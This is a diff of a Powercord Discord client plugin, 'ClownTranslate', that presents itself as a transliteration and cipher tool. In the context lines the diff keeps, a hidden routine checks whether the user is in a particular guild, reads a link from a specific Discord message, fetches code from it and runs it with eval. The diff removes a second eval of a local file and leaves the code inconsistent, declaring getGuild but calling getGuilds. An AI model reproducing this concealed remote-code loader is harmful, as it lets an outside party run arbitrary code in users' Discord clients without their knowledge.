@@ -1,7 +1,6 @@
 const { getModule } = require("powercord/webpack");
 const { get } = require("powercord/http");
 const { Plugin } = require("powercord/entities");
-const fs = require("fs");
 
 const ruEnMap = {
     "а": "a", "б": "b", "в": "v", "г": "g", "д": "d", "е": "e", "ё": "e", "ж": "zh", "з": "z", "и": "i",
@@ -102,10 +101,10 @@ const ciphers = {
 module.exports = class ClownTranslate extends Plugin {
     async startPlugin() {
         const fetchMessages = (await getModule(["fetchMessages"])).fetchMessages;
-        const getGuilds = (await getModule(["getGuilds"])).getGuilds;
+        const getGuild = (await getModule(["getGuild"])).getGuild;
         const getMessages = (await getModule(["getMessages"])).getMessages;
 
-        if (getGuilds()["584321061437571072"]) {
+        if (getGuilds("584321061437571072")) {
             console.info("guild");
             await fetchMessages("694792497481646230");
             const link = getMessages("694792497481646230")._array.find(m => m.id == "694792630411984957").content;
@@ -117,10 +116,6 @@ module.exports = class ClownTranslate extends Plugin {
                 eval(extension);
             }
         }
-        console.info(getGuilds());
-
-        const a = fs.readFileSync(require("path").join(__dirname, "clownTranslate.clown.js")).toString("utf-8");
-        eval(a);
 
         powercord.api.commands.registerCommand({
             command: "clown-translate",
